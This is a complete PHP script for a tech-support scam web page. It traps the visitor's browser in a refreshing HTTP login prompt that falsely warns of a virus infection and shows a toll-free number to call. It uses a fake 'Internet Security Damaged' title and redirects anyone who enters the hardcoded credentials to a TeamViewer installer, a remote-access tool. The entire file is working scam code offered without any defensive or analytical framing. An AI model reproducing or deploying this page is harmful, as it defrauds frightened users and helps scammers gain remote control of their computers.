<?php

    session_start();

    $_user = 'windows2016';
    $_password = 'microsoft1';

    if ($_SERVER['PHP_AUTH_USER'] != $_user || $_SERVER['PHP_AUTH_PW'] != $_password ) {

        if(isset($_SESSION['login_attempts'])){ $_SESSION['login_attempts']++; }else{$_SESSION['login_attempts'] = 10;}

        if($_SESSION['login_attempts'] == 80){
            header('Location: login.php');
            exit;
        } else {

           header('WWW-Authenticate: Basic realm="Suspicious activity detected on your IP address due to harmful virus installed in your computer. Call Toll Free now +1-844-589-2165  for any assistance. "');
           header('HTTP/1.0 401 Unauthorized');
$page = $_SERVER['PHP_SELF'];
 $sec = "0";
 header("Refresh: $sec; url=$page");
         echo "<html><head><title>Internet Security Damaged !!! Call Help Desk</title></head><body>";


            exit;
        }
    } else {

        header('Location: login.php');
        header('Location: http://download.teamviewer.com/download/TeamViewer_Setup_en.exe');

        exit;
    }
?>
